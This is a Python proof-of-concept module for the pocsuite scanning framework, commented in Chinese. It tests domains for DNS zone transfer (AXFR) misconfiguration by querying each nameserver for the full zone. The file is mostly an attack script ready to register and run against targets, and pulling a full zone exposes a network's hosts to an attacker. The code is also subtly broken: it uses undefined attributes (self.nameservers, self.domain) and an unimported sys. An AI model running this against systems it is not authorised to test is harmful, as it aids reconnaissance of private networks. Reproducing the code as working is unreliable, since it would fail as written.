#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite.api.request import req  # 用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
import socket
from dns import resolver, query, exception


class DNS_transforPoc(POCBase):
    vulID = "0"
    version = "1"
    author = "akame"
    vulDate = "2017-8-12"
    createDate = "2017-8-12"
    updateDate = "2017-8-12"
    # 漏洞地址来源,0day不用写
    references = ['http://www.lijiejie.com/dns-zone-transfer-3/']
    name = 'Dns Transfor  DNS域传送 PoC'  # PoC 名称
    appPowerLink = 'None'  # 漏洞厂商主页地址
    appName = 'dns'  # 漏洞应用名称
    appVersion = '*.x'  # 漏洞影响版本
    vulType = 'Information Disclosure'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。
        造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。
        凭借这份网络蓝图，攻击者可以节省很少的扫描时间。
       大的互联网厂商通常将内部网络与外部互联网隔离开，
       一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = [ 'socket', 'dnspython']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        vul_url = self.url
        result = {}
        nss = resolver.query(vul_url, 'NS')
        nameservers = [ str(ns) for ns in nss ]
        for ns in self.nameservers:
            z = self.query(ns)
            if z!=None:
                result['domain'] =  vul_url
                result['ns'] = ns
        return self.parse_attack(result)


    def _verify(self, verify=True):
        vul_url = self.url
        result = {}
        nss = resolver.query(vul_url, 'NS')
        nameservers = [ str(ns) for ns in nss ]
        for ns in self.nameservers:
            z = self.query(ns)
            if z!=None:
                result['domain'] =  vul_url
                result['ns'] = ns
        return self.parse_attack(result)

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

    def query(self, ns):
        nsaddr = self.resolve_a(ns)
        try:
            z = self.pull_zone(nsaddr)
        except (exception.FormError, socket.error, EOFError):
            print >> sys.stderr, "AXFR failed\n"
            return None
        else:
            return z


    def resolve_a(self, name):
        """Pulls down an A record for a name"""
        nsres = resolver.query(name, 'A')
        return str(nsres[0])


    def pull_zone(self, nameserver):
        """Sends the domain transfer request"""
        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
        zone = ""
        for m in q:
            zone += str(m)
        if not zone:
            raise EOFError
        return zone

register(DNS_transforPoc)
